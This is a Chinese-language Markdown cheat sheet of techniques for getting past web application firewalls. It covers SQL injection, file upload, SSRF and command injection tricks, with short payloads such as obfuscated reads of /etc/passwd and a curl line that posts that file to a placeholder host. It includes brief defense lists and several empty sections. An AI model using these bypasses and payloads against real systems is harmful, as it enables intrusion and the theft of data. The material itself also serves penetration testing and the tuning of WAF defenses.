# WAF
- [WAF](#waf)
  - [漏洞类型](#漏洞类型)
    - [注入](#注入)
      - [Mysql](#mysql)
      - [SqlServer](#sqlserver)
    - [文件上传](#文件上传)
      - [前端JS过滤](#前端js过滤)
      - [MIME类型](#mime类型)
      - [解析漏洞](#解析漏洞)
      - [0x00截断](#0x00截断)
      - [文件内容头校验（GIF89a)](#文件内容头校验gif89a)
      - [二次包含](#二次包含)
      - [防御](#防御)
    - [SSRF](#ssrf)
      - [编码](#编码)
      - [瞄点符号](#瞄点符号)
      - [高信域名重定向](#高信域名重定向)
      - [添加端口](#添加端口)
      - [短链接](#短链接)
      - [302跳转](#302跳转)
      - [防御](#防御-1)
    - [命令注入](#命令注入)
      - [Linux](#linux)
        - [通配符](#通配符)
        - [字符串拼接](#字符串拼接)
        - [\ (回车)](#-回车)
        - [curl -d](#curl--d)
        - [反引号](#反引号)
        - [大括号](#大括号)
      - [Windows](#windows)
        - [特殊符号](#特殊符号)
        - [set变量](#set变量)
        - [切割字符串](#切割字符串)
    - [XSS](#xss)
  - [WAF类型](#waf类型)
    - [通用](#通用)
      - [大小写绕过](#大小写绕过)
      - [注释符绕过](#注释符绕过)
      - [编码绕过](#编码绕过)
      - [分块传输](#分块传输)
      - [使用空字节绕过](#使用空字节绕过)
      - [关键字替换绕过](#关键字替换绕过)
      - [http协议覆盖绕过](#http协议覆盖绕过)
      - [白名单IP绕过](#白名单ip绕过)
      - [真实IP绕过](#真实ip绕过)
      - [参数污染](#参数污染)
      - [溢出waf绕过](#溢出waf绕过)
      - [畸形数据包](#畸形数据包)
    - [云锁](#云锁)
  - [参考](#参考)
## 漏洞类型
### 注入
#### Mysql
1. and -> %26(&)
2. , -> join
3. mysql版本大于5.6.x新增加的两个表**innodb_index_stats**和**innodb_table_stats**,主要是记录的最近数据库的变动记录,可用于代替informaiton_schema查询库名和表名.  
```sql
    select database_name from mysql.innodb_table_stats group by database_name;
    select table_name from mysql.innodb_table_stats where database_name=database();
```
4. 无列名注入,将目标字段与已知值联合查询,利用别名查询字段数据
```sql
    select group_concat(`2`) from (select 1,2 union select * from user)x 
```
5. 无列名注入,利用子查询一个字段一个字段进行大小比较进行布尔查询
```sql
    select ((select 1,0)>(select * from user limit 0,1))
```
6. 空白字符:09 0A 0B 0D A0 20
7. \`:select\`version\`();绕过空格和正则.
8. 点(.):在关键字前加点,`select-id-1+3.from qs_admins;`
9. @: `select@^1.from admins;`
#### SqlServer
1. IIS+sqlserver: IBM编码
2. 空白字符: 01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20
3. 百分号%:在ASP+IIS时,单独的%会被忽略,绕过关键字,`sel%ect * from admin`.
4. %u:asp+iis,aspx+iis,对关键字的某个字符进行Unicode编码.
### 文件上传
#### 前端JS过滤
Burp抓包修改
#### MIME类型
针对根据MIME类型来确定文件类型的.
1. 修改Content-type类型绕过白名单或者黑名单. 
2. 直接删除Content-type.
#### 解析漏洞
1. Apache
2. IIS
3. Nginx
#### 0x00截断
php version < 5.2  
java jdk < 1.6
#### 文件内容头校验（GIF89a)
#### 二次包含
1. 只检测(jsp,php,aspx等后缀)的内容.
先上传包含恶意代码的txt等不会被检测的文件后缀,再上传一个正常的(jsp,php,aspx文件)来包含引用txt文件.
#### 防御
1. 上传目录不可执行
2. 白名单
3. 文件名随机数
### SSRF
#### 编码
1. 双字编码
2. URL编码
3. 16进制编码
4. 8进制编码
#### 瞄点符号
`http://example.com/?url=http://google.com#http://example.com`
#### 高信域名重定向
`http://example.com/?url=http://abc.com/?redirect=https://google.com`
#### 添加端口
`127.0.0.1:80`
#### 短链接
1. 使用4m短网址或站长工具即可（短链接本质是302跳转）
2. is.gd可以自定义后缀的短网址
#### 302跳转
自动重定向
#### 防御
1. 白名单
2. 协议限制
3. 限制访问内网
4. 对响应进行验证
5. 防火墙规则限制
### 命令注入
#### Linux
区别大小写
##### 通配符
`/???/c?t /?t?/p??swd` -> `cat /etc/passwd`
##### 字符串拼接
1. python,java: + 
2. php, perl: .
3. 
```
a=who
b=ami
ab
```
##### \ (回车)
1. `c\a\t /etc/passwd`
2. `c\ 回车 at /etc/passwd
##### curl -d
curl -d 参数能够读取本地文件  
`curl -d @/etc/passwd x.x.x.x:8080`
##### 反引号
```
``内的字符会被当成命令执行
```
##### 大括号
{}代替空格  
`{ls,-alt}`
#### Windows
不区分大小写
##### 特殊符号
这些符号不会影响命令执行,
1. "
2. ^ 
3. ()
```
whoami //正常执行
w"h"o"a"m"i //正常执行
w"h"o"a"m"i" //正常执行
wh"“oami //正常执行
wh”“o^am"i //正常执行
((((Whoam”"i)))) //正常执行
```
##### set变量
%%之间的变量会引用其值
```
set a=who
set b=ami
%a%%b%
```
##### 切割字符串
截取字符串:
%a:~0,6%,取变量a的0到6的值
### XSS
## WAF类型
### 通用
#### 大小写绕过
#### 注释符绕过
```
#
-- 
-- - 
--+ 
//
/**/
```
#### 编码绕过
1. IBM编码  

可识别IBM编码的场景
```
Nginx, uWSGl-Django-Python2 & 3
Apache-TOMCAT7/8- JVM1.6/1.8-JSP
Apache- PHP5 (mod_ php & FastCGI)
IIS (6, 7.5, 8, 10) on ASP Classic, ASP.NET and PHP7.1- FastCGI
```
2. url双编码
3. hex编码
4. base64
#### 分块传输
在HTTP Hader中加入` Transfer-Encoding: chunked`,表示采用分块编码,每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括它结尾的，也不包括分块数据结尾的，且最后需要用0独占一行表示结束。
利用分块传输来分割敏感关键字.
#### 使用空字节绕过
#### 关键字替换绕过
#### http协议覆盖绕过
1. 多boundary定义
在`Content-type: multipart/form-date`中定义多个`boundary`,导致waf检测范围和上传范围不一致.
2. 
#### 白名单IP绕过
针对白名单IP不做检测,而IP从HTTP Header中获取,通过XFF头等进行伪造.
#### 真实IP绕过
云WAF通过寻找真实IP绕过WAF
1. 多地点Ping
2. 子域C段
3. 邮件服务器
4. 信息泄露
5. DNS历史解析记录
6. SSRF
通过使用Connection: keep-alive 达到一次传输多个http包.
1. 将两个请求的request放在一起,并且都设置为`Connection: keep-alive`.
#### 参数污染
通常在一个请求中,同样名称的参数只会出现一次,但是在 HTTP 协议中是允许同样名称的参数出现多次的,通过对一个参数多次传值来绕过检测.  
常见场景:
![](2021-12-05-17-05-09.png)
1. 对多个相同参数只取其中一个.
2. 对多个相同的参数进行拼接.
#### 溢出waf绕过

#### 畸形数据包
主要利用WAF和服务器的解析差异,构造一个WAF不能正确识别但服务端可以识别的数据包.
1. 文件上传时,去掉filename的双引号,导致WAF不能正确获取到文件上传的后缀,但服务端却可以得到正确的后缀.
```
Content-Disposition: form-data; name="file"; filename=1.jsp
```
2. 用多参数或者无效数据填充文件内容或者文件名，超出WAF的检测限制范围，从而绕过检测.
### 云锁
1. #后面的默认为注释,不进行检查,`?id=1#' union select user()--+`即可

## 参考
https://mp.weixin.qq.com/s/OcIaKAgZquQnf7_-TnTcwQ
https://mp.weixin.qq.com/s/Mgo6Gvel9V0mxpsNIq1GlQ
https://blog.csdn.net/qq_41874930/article/details/115229870
https://blog.csdn.net/hackzkaq/article/details/108981610